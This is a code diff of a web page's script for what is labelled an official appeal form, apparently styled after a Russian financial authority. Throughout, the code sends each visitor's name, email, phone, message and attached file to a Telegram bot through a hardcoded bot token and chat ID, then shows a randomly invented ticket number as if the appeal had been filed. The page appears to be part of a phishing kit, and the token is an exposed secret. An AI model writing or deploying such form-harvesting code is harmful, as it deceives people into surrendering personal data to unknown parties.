@@ -122,51 +122,13 @@
     </footer>
 
     <script>
-        // === НАСТРОЙКИ TELEGRAM ===
-        const BOT_TOKEN = "8831492348:AAG9GM8EUjHe0J9NSFO2FqEsVKvbJ95MC4s";
-        const CHAT_ID = "7386406575";
+        // ============================================
+        // 📋 БОТ ДЛЯ ЗАЯВОК: @FormaRosfinBot
+        // ============================================
+        const BOT_TOKEN_APPEALS = "8831492348:AAG9GM8EUjHe0J9NSFO2FqEsVKvbJ95MC4s";
+        const CHAT_ID_APPEALS = "7386406575";
 
-        // === ФУНКЦИЯ ДЛЯ ОТПРАВКИ СООБЩЕНИЯ В TELEGRAM ===
-        async function sendToTelegram(text, file = null) {
-            try {
-                // Отправка текста
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
-                });
-                const result = await response.json();
-
-                if (!result.ok) {
-                    throw new Error(result.description || 'Ошибка отправки');
-                }
-
-                // Отправка файла если есть
-                if (file) {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('document', file);
-
-                    const fileUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-                    await fetch(fileUrl, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-
-                return true;
-            } catch (error) {
-                console.error('❌ Ошибка:', error);
-                throw error;
-            }
-        }
-
-        // === ОТПРАВКА ФОРМЫ ===
+        // === ОТПРАВКА ЗАЯВКИ В БОТ @FormaRosfinBot ===
         async function sendForm(event) {
             event.preventDefault();
             
@@ -180,7 +142,6 @@
             const fileInput = document.getElementById('file');
             const file = fileInput.files[0];
 
-            // Валидация
             if (!fullName || !email || !phone || !subject || !message) {
                 alert('⚠️ Заполните все обязательные поля!');
                 return;
@@ -198,7 +159,6 @@
             button.innerText = "Отправка...";
 
             try {
-                // Формируем сообщение
                 const date = new Date();
                 let text = `📋 НОВОЕ ОБРАЩЕНИЕ\n`;
                 text += `═══════════════════════\n`;
@@ -211,17 +171,47 @@
                 text += `═══════════════════════\n`;
                 text += `🕐 ${date.toLocaleString('ru-RU')}`;
 
-                // Отправка в Telegram
-                await sendToTelegram(text, file);
+                // === ОТПРАВКА В БОТ ДЛЯ ЗАЯВОК (@FormaRosfinBot) ===
+                const url = `https://api.telegram.org/bot${BOT_TOKEN_APPEALS}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID_APPEALS,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
 
-                // Успех
-                const ticketNumber = Math.floor(100000 + Math.random() * 900000);
-                document.getElementById('ticketNumber').innerText = ticketNumber;
-                document.getElementById('successModal').style.display = 'flex';
-                document.getElementById('appealForm').reset();
+                const result = await response.json();
+                console.log('📨 Ответ @FormaRosfinBot:', result);
+
+                if (result.ok) {
+                    // Отправка файла если есть
+                    if (file) {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID_APPEALS);
+                        formData.append('document', file);
+
+                        const fileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_APPEALS}/sendDocument`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        const fileResult = await fileResponse.json();
+                        console.log('📎 Файл отправлен:', fileResult);
+                    }
+
+                    const ticketNumber = Math.floor(100000 + Math.random() * 900000);
+                    document.getElementById('ticketNumber').innerText = ticketNumber;
+                    document.getElementById('successModal').style.display = 'flex';
+                    document.getElementById('appealForm').reset();
+                } else {
+                    alert('❌ Ошибка: ' + (result.description || 'Неизвестная ошибка'));
+                }
 
             } catch (error) {
-                alert('❌ Ошибка отправки: ' + error.message);
+                console.error('❌ Ошибка:', error);
+                alert('❌ Ошибка соединения! Проверьте интернет.');
             } finally {
                 button.disabled = false;
                 button.innerText = "Отправить официальное обращение";
